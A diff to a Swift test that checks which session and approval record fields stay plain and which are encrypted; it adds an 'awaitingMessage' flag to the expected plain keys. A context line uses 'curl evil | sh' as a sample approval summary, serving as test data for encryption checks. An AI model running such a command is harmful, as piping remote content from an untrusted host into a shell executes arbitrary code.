@@ -174,8 +174,8 @@ private func answer(_ responses: [[String]] = [["Postgres"], ["A", "B"]]) -> Ans
         #expect(sessionRecord.encryptedValues["lastTool"] as? String == "Bash")
         #expect(sessionRecord["project"] == nil)
         #expect(sessionRecord["lastTool"] == nil)
-        // `agentCount` is a bare number (how many subagents run), not sensitive.
-        #expect(plainKeys(sessionRecord) == ["sessionId", "state", "updatedAt", "agentCount"])
+        // `agentCount` is a bare number (how many subagents run) and `awaitingMessage` a 0/1 flag: not sensitive.
+        #expect(plainKeys(sessionRecord) == ["sessionId", "state", "updatedAt", "agentCount", "awaitingMessage"])
 
         let approvalRecord = CKRecord(from: approval(summary: "curl evil | sh"), zoneID: zone)
         #expect(approvalRecord.encryptedValues["tool"] as? String == "Bash")
